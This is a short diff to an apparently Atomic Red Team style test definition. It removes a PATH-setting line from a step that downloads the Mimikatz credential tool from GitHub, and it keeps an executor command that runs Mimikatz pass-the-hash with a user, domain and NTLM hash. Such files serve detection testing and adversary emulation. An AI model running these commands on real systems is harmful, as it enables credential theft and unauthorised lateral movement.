@@ -33,7 +33,6 @@ atomic_tests:
     get_prereq_command: |
       Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
       Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
-      [Environment]::SetEnvironmentVariable("Path", $env:Path + ";" + $env:Temp+"\mimikatz\Win32\")
   executor:
     command: |
       #{mimikatz_path} # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
